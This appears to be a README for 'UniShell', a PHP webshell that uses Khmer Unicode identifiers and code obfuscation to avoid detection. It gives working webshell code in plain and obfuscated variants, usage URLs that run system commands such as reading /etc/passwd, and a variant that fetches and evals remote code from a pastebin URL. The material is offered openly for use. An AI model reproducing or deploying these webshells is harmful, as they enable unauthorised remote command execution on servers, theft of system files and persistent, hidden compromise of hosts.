# UniShell
Unishell is a piece of php webshell script that based on nano shell (https://github.com/s0md3v/nano) which are using khmer unicode characters (ក, ខ, គ) and combinded with YAK Obfuscator to be undetectable and more powerful.

### None-Obfuscate
1. Soriya
```php
<?php $ា=$_GET;if($ា[ត]!=null)$ា[ល]==ធិ៤០៤&$ា[ម]($ា[ប]); ?>
```
**Note:** For the options `ល` is the password `ធិ៤០៤` which mean you can change the string with your own password.

### Option
`ត` for any String; `ល` for Password; `ម` for Function; `ប` for Command;

### Usage
`http/s://testing.com/unishell.php?ត=any&ល=password&ម=function&ប=command`

**For example**, we want to show the /etc/passwd in the system so we can use the options as below:

`http/s://testing.com/unishell.php?ត=true&ល=ធិ៤០៤&ម=passthru&ប=cat /etc/passwd`

### Screenshot-1
![handler](https://i.imgur.com/YS1JMHE.png)

2. Kolab
```php
<?$ា=$_GET;if($ា[ត]!=null)$ា[ល]==ធិ៤០៤&$ា[ម]($ា[ប]); eval('?>'.file_get_contents($ា[ដ]));?>
```
### Option
`ត` for any String; `ល` for Password; `ម` for Function; `ប` for Command; `ដ` for Url;

### Usage
`http/s://testing.com/unishell.php?ត=any&ល=password&ម=function&ប=command&ដ=url`

***For example***, we want to use the PHP Web Shell from another source in the target system, so it will be:

`http/s://testing.com/unishell.php?ត=true&ល=ធិ៤០៤&ម=passthru&ប=uname -a&ដ=https://pastebin.com/raw/JfLvh0MG`

### Screenshot-2

![handler](https://imgur.com/WCfChGe.png)

### Screenshot-3

![handler](https://imgur.com/HSb9rbd.png)

### Obfuscated
In this code below i used yak to obfuscated.

1. Raksmey-Soriya
```php
<?php goto JFDwF; NnbkH: $gOzsO[ល] == ធិ៤០៤ & $gOzsO[ម]($gOzsO[ប]); goto ymB7H; B3hLL: if (!($gOzsO[ត] != null)) { goto y8I95; } goto NnbkH; JFDwF: $gOzsO = $_GET; goto B3hLL; ymB7H: y8I95: ?>
```
2. Bonla-Kolab
```php
<?php goto N6Ag4; KMKUH: $I9NO2[ល] == ធិ៤០៤ & $I9NO2[ម]($I9NO2[ប]); goto cuHHG; N6Ag4: $I9NO2 = $_GET; goto clZU6; clZU6: if (!($I9NO2[ត] != null)) { goto P0yeE; } goto KMKUH; cuHHG: P0yeE: goto hYsr_; hYsr_: eval("\x3f\x3e" . file_get_contents($I9NO2[ដ])); ?>
```
### License
If you want to use or modify it, just give me or mr s0md3v a credit or some donation. xD
